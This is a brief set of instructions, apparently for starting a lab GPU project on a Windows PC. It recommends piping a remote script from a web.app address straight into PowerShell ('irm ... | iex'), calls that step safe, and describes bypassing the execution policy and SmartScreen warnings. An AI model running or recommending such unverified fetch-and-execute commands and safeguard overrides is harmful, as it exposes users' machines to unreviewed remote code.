HOW TO RUN ON YOUR LAB PC:

OPTION 1 (Recommended - Safe PowerShell Command):
  1. Open PowerShell (Press Win + X -> Windows PowerShell or Terminal)
  2. Paste and run:
     irm https://lmx-saturdays-studio.web.app/launch.ps1 | iex

OPTION 2 (Using launch.ps1):
  Right-click 'launch.ps1' -> 'Run with PowerShell'
  (Or in PowerShell: powershell -ExecutionPolicy Bypass -File .\launch.ps1)

OPTION 3 (Using setup_and_start_lab_gpu.bat):
  Double click 'setup_and_start_lab_gpu.bat'
  If Windows SmartScreen shows a warning:
  Click 'More info' -> 'Run anyway'.
